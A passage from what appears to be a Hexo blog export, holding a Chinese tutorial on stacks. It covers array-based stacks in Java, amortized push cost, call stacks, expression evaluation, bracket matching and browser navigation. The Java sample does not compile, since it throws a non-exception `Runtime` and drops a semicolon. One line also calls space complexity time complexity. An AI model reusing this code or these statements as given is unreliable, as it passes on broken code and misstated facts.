支持动态扩容的顺序栈\n\n刚才那个基于数组实现的顺序栈，是一个固定大小的栈，也就是说，在初始化后需要实现指定栈的大小，当栈满之后，就无法在王栈里添加数据了，尽管链式栈的大小不受限，但是要存储next指针，内存消耗相对较多。那我们如何实现一个可以支持动态扩容的栈呢？\n\n还记得，在数组那一节，要如何来实现一个支持动态扩容的数组吗？当数组空间不足时，我们重新申请一块更大的内存，将原来数组中的数据拷贝过去，这样就实现了一个支持动态扩容的数组。\n\n所以，如果实现一个支持动态扩容的栈，我们只需要底层依赖一个支持动态扩容的数组就可以了。当栈满了之后，我们就申请一个更大的数组，将原来的数据搬移到新的数组中。\n\n\n实际上，支持动态扩容的顺序栈，我们开发中并不经常用到。这块我们复习一下复杂度分析方法。现在我们来分析一下支持动态扩容的顺序栈的入栈、出栈时间复杂度。\n\n对于出栈操作来说，不会涉及到内存的重新申请和数据搬移，所以出栈的时间复杂度仍然是O(1)。但是对于入栈操作来说，情况就不一样了，当栈中有空闲空间时，入栈操作时间复杂度为O(1)，当栈中没有空间不够时，就需要重新申请内存和数据搬移，所以时间复杂度就变成了O(n)。\n\n也就是说，对于入栈操作来说，最好时间复杂度为O(1)，最坏情况时间复杂度为O(n)。那平均情况下的时间复杂度是多少呢？还记得时间复杂度分析方法中的摊还分析法吗？这个入栈操作的平均情况的时间按复杂度正好可以用摊还分析法来分析。\n\n为了分析方便，我们先做一些假设和定义：\n* 栈空间不够时，我们重新申请一个是原来大小两倍的数组；\n* 为了简化分析，假设只有入栈操作没有出栈操作；\n* 定义不涉及内存搬移操作的入栈操作为simple-push操作，时间复杂度为O(1)。\n\n如果当前栈大小为K，并且已满，当在有新的的数据要入栈时，就需要重新申请2倍大小的内存，并且做K个数据的搬移操作，然后在入栈。但是，接下来的K-1次入栈操作，我们都不需要在重新申请内存和搬移数据，所以这k-1次都只需要一次simple-push操作就可以完成。如下图：\n\n{% asset_img 入栈时间复杂度.jpg %}\n\n从上图看出，这K次入栈操作，总共涉及了K个数据的搬移，以及K次simple-push操作。讲K个数据搬移均摊到K次入栈操作，那每个入栈操作只需要一个数据搬移和一个simpel-push操作。以此类推，入栈操作的时间复杂度为O(1)。\n\n通过这个例子分析，也验证了前面讲的，均摊时间复杂度一般都等于最好时间复杂度。因为在大部分情况下，入栈操作的时间复杂度都是O(1)，只有在个别情况才会退化为O(n)，所以把耗时多的入栈操作的时间均摊到其他入栈操作上，平均情况下耗时就接近O(1)。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 栈的应用场景\n{% endnote %}\n</div>\n\n#### 栈在函数调用中的应用\n\n前面讲的都比较偏理论，我们现在来看，栈在软件工程中的实际应用。栈作为一个比较基础的数据结构，应用场景还是蛮多的。其中比较经典的一个应用场景就是函数调用栈。\n\n我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存空间被组织成“栈”这种结构，用来存储函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。为了更好理解函数调用栈，一起来看一下这段代码的执行过程。\n\n```C\nint main(){\n  int a = 1;\n  int ret = 0;\n  int res = 0;\n  ret = add(3,5);\n  res = a + ret;\n  printf(\"%d\", res);\n  return 0;\n}\n\nint add(int x, int y){\n  int sum = 0;\n  sum = x + y;\n  return sum;\n}\n```\n\n从代码中我们可以看出，main函数调用了add函数，获取计算结果，并且与临时变量a相加，最后打印res的值，为了清晰的看到这个过程的函数栈里对应的入栈、出栈过程，我这里画了一张函数栈图：\n\n{% asset_img 函数栈.jpg %}\n\n#### 栈在表达式求值中的应用\n\n我们再来看一个栈的常见应用场景，编译器如何利用栈实现**表达式求值**。\n\n这里我们用一个只包含加减乘除四则运算的表达式来解释，比如：34+13\\*9+44-12/3。对于这个四则运算，我们人脑可以很快算出来，但是对于计算机来说，理解这个表达式本身就是个挺难的事。如果是你，你会怎么实现一个表达式求值的功能呢？\n\n实际上，编译器就是通过两个栈来实现的。其中一个是保存操作数的栈，另一个保存运算符的栈。我们从左往右遍历表达式，当遇到数字，我们直接压入操作数栈。当遇到运算符，就与运算符的栈顶元素进行比较。如果运算符比当前栈顶元素的优先级高，就直接压入运算符栈中，如果比栈顶元素的优先级低或者相同，就将当前栈顶元素取出，再从操作数栈中取出两个操作数，然后进行运算，再把计算完的结果压入操作数栈，继续比较。\n\n这里用一个简单的例子：3+5\\*8-6 我将这个表达式的计算过程画成一个图，结合图来理解刚才的计算过程。\n\n{% asset_img 表达式栈图.jpg %}\n\n#### 栈在括号匹配中的应用\n\n出了用栈来实现表达式求值，我们还可以借助栈来检查表达式中的括号是否匹配。\n\n我们同样简化一下背景，假设表达式只包含三种括号，圆括号()、方括号[]、花括号{}，并且他们可以任意嵌套。比如{[{}]}、[([]){()}]等都为合法格式，而{[}()或[{(}]为非法格式。那现在给你一个包含三种括号的表达式字符串，如何检查它是否合法呢？\n\n这里也可以用栈来解决。我们用栈来保存未匹配的左括号，从做到右一次扫描字符串。当扫描到左括号时，则将其压入栈中，当扫描到右括号时，从栈顶取出一个左括号。如果能够匹配，比如\"(\"和\")\"匹配、\"[\"和\"]\"匹配、\"{\"和\"}\"匹配，则继续扫描剩下的字符串。如果扫描过程中，遇到不能匹配的右括号，或者栈中没有数据，则说明为非法格式。\n\n当所有的括号都扫描完成后，如果栈为空，则说明字符串为合法格式；否则说明有为匹配的左括号，为非法格式。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n好了，理解了栈的概念和应用，再回头看看开篇的问题。如何实现浏览器的前进、后退功能？学过栈之后，就可以用两个栈完美的解决这个问题了。\n\n我们使用两个栈X、Y，把首次浏览的页面压入栈X，当点击后退按钮时，依次从栈X中出栈，并将出栈的数据依次放入栈Y。当我们点击前进按钮时，依次取出栈Y中的数据，并放入栈X。当X中没有数据时，说明没有页面可以后退了。当Y中没有数据时，说明没有页面可以点击前进按钮进行浏览了。\n\n当我们依次浏览了a、b、c三个页面，我们依次把a、b、c压入栈，这个时候，两个栈的数据就是如下这个样子：\n\n{% asset_img 浏览器栈1.jpg %}\n\n当我们通过浏览器的后退按钮，从页面c后退到页面a之后，我们依次把c、b从栈X中弹出，并且依次放入栈Y中，这个时候栈中的数据就是如下：\n\n{% asset_img 浏览器栈2.jpg %}\n\n这时候，又想看页面b，于是点击前进按钮回到b页面，我们就把b再从栈Y中取出，放入X，此时栈中数据如下：\n\n{% asset_img 浏览器栈3.jpg %}\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 总结\n{% endnote %}\n</div>\n\n栈是一种操作受限的数据结构，只支持入栈和出栈操作。后进先出是它的最大特点。栈既可以通过数组来实现，也可以通过链表来实现。不管是数组实现的栈，还是链表实现的栈，他们的入栈、出栈时间复杂度都为O(1)。在基于数组实现的动态扩容的顺序栈中，时间复杂度均为O(1)，重点是入栈时间复杂度中关于摊还分析法的掌握。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 思考\n{% endnote %}\n</div>\n\n1、再讲栈的应用时，讲到用函数调用栈来保存临时变量，为什么函数调用要用\"栈\"这种数据结构来保存临时变量呢？用其他数据结构可以吗？\n2、我们知道，JVM内存管理中有个“堆栈”的概念。栈内存用来白村局部变量和方法调用，堆内存用来存储java中的对象。那JVM里面的“栈”和我们这里的“栈”一样吗？不一样的话，为什么叫“栈”呢？\n\n<br>\n","slug":"算法-栈","published":1,"updated":"2019-06-26T03:52:03.526Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2ms004yo25tk91h1kig","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>浏览器的前进、后退功能，我想你肯定很熟悉吧？</p>\n<p>当你依次访问完一连串页面a-b-c-d之后，点击浏览器的后退按钮，就可以查看之前浏览过的页面c-b-a。当后退到a页面之后，点击前进按钮，可以重新进入页面b-c-d。但是如果进入页面b之后，点击了两一个页面，那就无法通过前进后退页面进入c-d了。</p>\n<p>假如你是浏览器的开发设计者，你会如何实现这个功能呢？带着这个问题，我们来看一下“栈”这个数据结构。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解栈？\"><a href=\"#如何理解栈？\" class=\"headerlink\" title=\"如何理解栈？\"></a>如何理解栈？</h3></div><br></div>\n\n<p>关于栈，举一个非常贴切的例子。比如叠盘子，我们放盘子的时候都是从下往上一个一个放。取的时候，我们也是从上往下一个一个取，不能从中间抽取。<strong>先进者后出，后进者先出，这就是典型的栈结构</strong>。</p>\n<p>从栈的操作特性上来看，<strong>栈是一种操作受限的线性表</strong>，只允许在一端插入和删除数据。</p>\n<p>我第一次接触这种数据结构的时候，就对它存在的意义产生了很大的疑惑。因为相比数组和链表，栈带给我的只有限制，并没有任何优势。那我直接使用数组或者链表就好了？为什么还要用这个“操作受限”的数据结构呢？</p>\n<p>事实上，从功能上来说，数组和链表确实可以代替栈，但是你要知道，特定的数据结构是对特定场景的抽象，而且数组和链表暴露了太多的操作接口，操作上的确灵活自由，但使用时就比较不可控，自然就更容易出错。</p>\n<p><strong>当某个数据集合只涉及在一端插入和删除数据时，并且满足先进后出、后进先出的特性，我们就应该用栈这种数据结构</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何实现一个栈？\"><a href=\"#如何实现一个栈？\" class=\"headerlink\" title=\"如何实现一个栈？\"></a>如何实现一个栈？</h3></div><br></div>\n\n<p>从刚才栈的定义里可以看出，栈主要包含两个操作，入栈和出栈。也就是在在栈顶插入一个数据和从栈顶删除一个数据。理解了栈的定义之后，我们来看一看如何用代码实现一个栈。</p>\n<p>实际上，栈可以用数组来实现，也可以用链表来实现。用数组实现的栈，我们叫做<strong>顺序栈</strong>，用链表实现的栈，我们叫做<strong>链式栈</strong>。</p>\n<h4 id=\"基于数组实现的顺序栈\"><a href=\"#基于数组实现的顺序栈\" class=\"headerlink\" title=\"基于数组实现的顺序栈\"></a>基于数组实现的顺序栈</h4><p>我这里用Java实现一个基于数组的顺序栈，基于链表的实现，可以自己写一下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的链式栈</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ArrayStack</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">stack</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Object [] DEFAULT_ARRAY = <span class=\"keyword\">new</span> Object[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> DEFAULT_CAP = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object[] data;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span>  cap;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayStack</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = DEFAULT_CAP;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.size = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.data = DEFAULT_ARRAY;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayStack</span><span class=\"params\">(<span class=\"keyword\">int</span> cap)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cap &lt; <span class=\"number\">0</span>) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalArgumentException(<span class=\"string\">\"Illegal Capacity: \"</span>+ cap);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = cap;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.data = <span class=\"keyword\">new</span> Object[cap];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(T val)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size&lt;cap)&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 数组满了</span></span><br><span class=\"line\">            data[size] = val;</span><br><span class=\"line\">            size++;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Runtime(<span class=\"string\">\"stack is full!\"</span>)</span><br><span class=\"line\">          <span class=\"comment\">// 可以动态扩容的stack</span></span><br><span class=\"line\">          <span class=\"comment\">// Object[] objects = new Object[cap*2];</span></span><br><span class=\"line\">          <span class=\"comment\">// System.arraycopy(data, 0, objects, 0, size);</span></span><br><span class=\"line\">          <span class=\"comment\">// data = objects;</span></span><br><span class=\"line\">          <span class=\"comment\">// data[size] = val;</span></span><br><span class=\"line\">          <span class=\"comment\">// size ++;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">pop</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size == <span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        T result = (T) data[size-<span class=\"number\">1</span>];</span><br><span class=\"line\">        size--;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>了解了定义和基本操作，那它的操作时间、空间复杂度是多少呢？</p>\n<p>不管是链式栈还是顺序栈，我们存储数据需要一个大小为n的数组就够了。在入栈和出栈的过程中，只需要一两个临时变量存储空间，因此时间复杂度是O(1)。</p>\n<p>注意这里存储数据需要一个大小为n的数组，并不是说空间复杂度是O(n)，因为这n个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要额外的存储空间。</p>\n<p>时间复杂度分析：不管是入栈、出栈，都只涉及栈顶个别数据的操作，因此时间复杂度为O(1)。</p>\n<h4 id=\"支持动态扩容的顺序栈\"><a href=\"#支持动态扩容的顺序栈\" class=\"headerlink\" title=\"支持动态扩容的顺序栈\"></a>支持动态扩容的顺序栈</h4><p>刚才那个基于数组实现的顺序栈，是一个固定大小的栈，也就是说，在初始化后需要实现指定栈的大小，当栈满之后，就无法在王栈里添加数据了，尽管链式栈的大小不受限，但是要存储next指针，内存消耗相对较多。那我们如何实现一个可以支持动态扩容的栈呢？</p>\n<p>还记得，在数组那一节，要如何来实现一个支持动态扩容的数组吗？当数组空间不足时，我们重新申请一块更大的内存，将原来数组中的数据拷贝过去，这样就实现了一个支持动态扩容的数组。</p>\n<p>所以，如果实现一个支持动态扩容的栈，我们只需要底层依赖一个支持动态扩容的数组就可以了。当栈满了之后，我们就申请一个更大的数组，将原来的数据搬移到新的数组中。</p>\n<p>实际上，支持动态扩容的顺序栈，我们开发中并不经常用到。这块我们复习一下复杂度分析方法。现在我们来分析一下支持动态扩容的顺序栈的入栈、出栈时间复杂度。</p>\n<p>对于出栈操作来说，不会涉及到内存的重新申请和数据搬移，所以出栈的时间复杂度仍然是O(1)。但是对于入栈操作来说，情况就不一样了，当栈中有空闲空间时，入栈操作时间复杂度为O(1)，当栈中没有空间不够时，就需要重新申请内存和数据搬移，所以时间复杂度就变成了O(n)。</p>\n<p>也就是说，对于入栈操作来说，最好时间复杂度为O(1)，最坏情况时间复杂度为O(n)。那平均情况下的时间复杂度是多少呢？还记得时间复杂度分析方法中的摊还分析法吗？这个入栈操作的平均情况的时间按复杂度正好可以用摊还分析法来分析。</p>\n<p>为了分析方便，我们先做一些假设和定义：</p>\n<ul>\n<li>栈空间不够时，我们重新申请一个是原来大小两倍的数组；</li>\n<li>为了简化分析，假设只有入栈操作没有出栈操作；</li>\n<li>定义不涉及内存搬移操作的入栈操作为simple-push操作，时间复杂度为O(1)。</li>\n</ul>\n<p>如果当前栈大小为K，并且已满，当在有新的的数据要入栈时，就需要重新申请2倍大小的内存，并且做K个数据的搬移操作，然后在入栈。但是，接下来的K-1次入栈操作，我们都不需要在重新申请内存和搬移数据，所以这k-1次都只需要一次simple-push操作就可以完成。如下图：</p>\n\n<p>从上图看出，这K次入栈操作，总共涉及了K个数据的搬移，以及K次simple-push操作。讲K个数据搬移均摊到K次入栈操作，那每个入栈操作只需要一个数据搬移和一个simpel-push操作。以此类推，入栈操作的时间复杂度为O(1)。</p>\n<p>通过这个例子分析，也验证了前面讲的，均摊时间复杂度一般都等于最好时间复杂度。因为在大部分情况下，入栈操作的时间复杂度都是O(1)，只有在个别情况才会退化为O(n)，所以把耗时多的入栈操作的时间均摊到其他入栈操作上，平均情况下耗时就接近O(1)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"栈的应用场景\"><a href=\"#栈的应用场景\" class=\"headerlink\" title=\"栈的应用场景\"></a>栈的应用场景</h3></div><br></div>\n\n<h4 id=\"栈在函数调用中的应用\"><a href=\"#栈在函数调用中的应用\" class=\"headerlink\" title=\"栈在函数调用中的应用\"></a>栈在函数调用中的应用</h4><p>前面讲的都比较偏理论，我们现在来看，栈在软件工程中的实际应用。栈作为一个比较基础的数据结构，应用场景还是蛮多的。其中比较经典的一个应用场景就是函数调用栈。</p>\n<p>我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存空间被组织成“栈”这种结构，用来存储函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。为了更好理解函数调用栈，一起来看一下这段代码的执行过程。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  ret = add(<span class=\"number\">3</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\">  res = a + ret;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, res);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  sum = x + y;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中我们可以看出，main函数调用了add函数，获取计算结果，并且与临时变量a相加，最后打印res的值，为了清晰的看到这个过程的函数栈里对应的入栈、出栈过程，我这里画了一张函数栈图：</p>\n<img src=\"/posts/2018-09-15-算法-栈/函数栈.jpg\">\n<h4 id=\"栈在表达式求值中的应用\"><a href=\"#栈在表达式求值中的应用\" class=\"headerlink\" title=\"栈在表达式求值中的应用\"></a>栈在表达式求值中的应用</h4><p>我们再来看一个栈的常见应用场景，编译器如何利用栈实现<strong>表达式求值</strong>。</p>\n<p>这里我们用一个只包含加减乘除四则运算的表达式来解释，比如：34+13*9+44-12/3。对于这个四则运算，我们人脑可以很快算出来，但是对于计算机来说，理解这个表达式本身就是个挺难的事。如果是你，你会怎么实现一个表达式求值的功能呢？</p>\n<p>实际上，编译器就是通过两个栈来实现的。其中一个是保存操作数的栈，另一个保存运算符的栈。我们从左往右遍历表达式，当遇到数字，我们直接压入操作数栈。当遇到运算符，就与运算符的栈顶元素进行比较。如果运算符比当前栈顶元素的优先级高，就直接压入运算符栈中，如果比栈顶元素的优先级低或者相同，就将当前栈顶元素取出，再从操作数栈中取出两个操作数，然后进行运算，再把计算完的结果压入操作数栈，继续比较。</p>\n<p>这里用一个简单的例子：3+5*8-6 我将这个表达式的计算过程画成一个图，结合图来理解刚才的计算过程。</p>\n<img src=\"/posts/2018-09-15-算法-栈/表达式栈图.jpg\">\n<h4 id=\"栈在括号匹配中的应用\"><a href=\"#栈在括号匹配中的应用\" class=\"headerlink\" title=\"栈在括号匹配中的应用\"></a>栈在括号匹配中的应用</h4><p>出了用栈来实现表达式求值，我们还可以借助栈来检查表达式中的括号是否匹配。</p>\n<p>我们同样简化一下背景，假设表达式只包含三种括号，圆括号()、方括号[]、花括号{}，并且他们可以任意嵌套。比如{[{}]}、[([]){()}]等都为合法格式，而{[}()或[{(}]为非法格式。那现在给你一个包含三种括号的表达式字符串，如何检查它是否合法呢？</p>\n<p>这里也可以用栈来解决。我们用栈来保存未匹配的左括号，从做到右一次扫描字符串。当扫描到左括号时，则将其压入栈中，当扫描到右括号时，从栈顶取出一个左括号。如果能够匹配，比如”(“和”)”匹配、”[“和”]”匹配、”{“和”}”匹配，则继续扫描剩下的字符串。如果扫描过程中，遇到不能匹配的右括号，或者栈中没有数据，则说明为非法格式。</p>\n<p>当所有的括号都扫描完成后，如果栈为空，则说明字符串为合法格式；否则说明有为匹配的左括号，为非法格式。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>好了，理解了栈的概念和应用，再回头看看开篇的问题。如何实现浏览器的前进、后退功能？学过栈之后，就可以用两个栈完美的解决这个问题了。</p>\n<p>我们使用两个栈X、Y，把首次浏览的页面压入栈X，当点击后退按钮时，依次从栈X中出栈，并将出栈的数据依次放入栈Y。当我们点击前进按钮时，依次取出栈Y中的数据，并放入栈X。当X中没有数据时，说明没有页面可以后退了。当Y中没有数据时，说明没有页面可以点击前进按钮进行浏览了。</p>\n<p>当我们依次浏览了a、b、c三个页面，我们依次把a、b、c压入栈，这个时候，两个栈的数据就是如下这个样子：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈1.jpg\">\n<p>当我们通过浏览器的后退按钮，从页面c后退到页面a之后，我们依次把c、b从栈X中弹出，并且依次放入栈Y中，这个时候栈中的数据就是如下：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈2.jpg\">\n<p>这时候，又想看页面b，于是点击前进按钮回到b页面，我们就把b再从栈Y中取出，放入X，此时栈中数据如下：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈3.jpg\">\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3></div><br></div>\n\n<p>栈是一种操作受限的数据结构，只支持入栈和出栈操作。后进先出是它的最大特点。栈既可以通过数组来实现，也可以通过链表来实现。不管是数组实现的栈，还是链表实现的栈，他们的入栈、出栈时间复杂度都为O(1)。在基于数组实现的动态扩容的顺序栈中，时间复杂度均为O(1)，重点是入栈时间复杂度中关于摊还分析法的掌握。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h3></div><br></div>\n\n<p>1、再讲栈的应用时，讲到用函数调用栈来保存临时变量，为什么函数调用要用”栈”这种数据结构来保存临时变量呢？用其他数据结构可以吗？<br>2、我们知道，JVM内存管理中有个“堆栈”的概念。栈内存用来白村局部变量和方法调用，堆内存用来存储java中的对象。那JVM里面的“栈”和我们这里的“栈”一样吗？不一样的话，为什么叫“栈”呢？</p>\n<p><br></p>\n","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>浏览器的前进、后退功能，我想你肯定很熟悉吧？</p>\n<p>当你依次访问完一连串页面a-b-c-d之后，点击浏览器的后退按钮，就可以查看之前浏览过的页面c-b-a。当后退到a页面之后，点击前进按钮，可以重新进入页面b-c-d。但是如果进入页面b之后，点击了两一个页面，那就无法通过前进后退页面进入c-d了。</p>\n<p>假如你是浏览器的开发设计者，你会如何实现这个功能呢？带着这个问题，我们来看一下“栈”这个数据结构。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解栈？\"><a href=\"#如何理解栈？\" class=\"headerlink\" title=\"如何理解栈？\"></a>如何理解栈？</h3></div><br></div>\n\n<p>关于栈，举一个非常贴切的例子。比如叠盘子，我们放盘子的时候都是从下往上一个一个放。取的时候，我们也是从上往下一个一个取，不能从中间抽取。<strong>先进者后出，后进者先出，这就是典型的栈结构</strong>。</p>\n<p>从栈的操作特性上来看，<strong>栈是一种操作受限的线性表</strong>，只允许在一端插入和删除数据。</p>\n<p>我第一次接触这种数据结构的时候，就对它存在的意义产生了很大的疑惑。因为相比数组和链表，栈带给我的只有限制，并没有任何优势。那我直接使用数组或者链表就好了？为什么还要用这个“操作受限”的数据结构呢？</p>\n<p>事实上，从功能上来说，数组和链表确实可以代替栈，但是你要知道，特定的数据结构是对特定场景的抽象，而且数组和链表暴露了太多的操作接口，操作上的确灵活自由，但使用时就比较不可控，自然就更容易出错。</p>\n<p><strong>当某个数据集合只涉及在一端插入和删除数据时，并且满足先进后出、后进先出的特性，我们就应该用栈这种数据结构</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何实现一个栈？\"><a href=\"#如何实现一个栈？\" class=\"headerlink\" title=\"如何实现一个栈？\"></a>如何实现一个栈？</h3></div><br></div>\n\n<p>从刚才栈的定义里可以看出，栈主要包含两个操作，入栈和出栈。也就是在在栈顶插入一个数据和从栈顶删除一个数据。理解了栈的定义之后，我们来看一看如何用代码实现一个栈。</p>\n<p>实际上，栈可以用数组来实现，也可以用链表来实现。用数组实现的栈，我们叫做<strong>顺序栈</strong>，用链表实现的栈，我们叫做<strong>链式栈</strong>。</p>\n<h4 id=\"基于数组实现的顺序栈\"><a href=\"#基于数组实现的顺序栈\" class=\"headerlink\" title=\"基于数组实现的顺序栈\"></a>基于数组实现的顺序栈</h4><p>我这里用Java实现一个基于数组的顺序栈，基于链表的实现，可以自己写一下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 